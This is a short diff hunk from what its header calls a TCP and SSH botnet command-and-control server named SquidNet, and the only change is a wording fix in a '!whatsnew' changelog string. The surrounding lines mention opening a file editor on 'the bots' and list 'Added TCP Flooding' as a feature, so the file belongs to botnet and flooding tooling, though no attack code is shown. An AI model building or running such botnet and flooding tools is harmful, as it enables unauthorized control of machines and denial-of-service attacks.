@@ -849,7 +849,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     self.log(f"\n[(SERVER)]: Attempting to open file editor for file {filename} on the bots.")
                 elif self.instruction.startswith("!whatsnew"):
                     print("""
-[+] New Features In the SquidNet:
+[+] New Features In SquidNet:
 
 [+] - Fixed Typo in Option-Parsing Message(affect-->effect).
 [+] - Added TCP Flooding
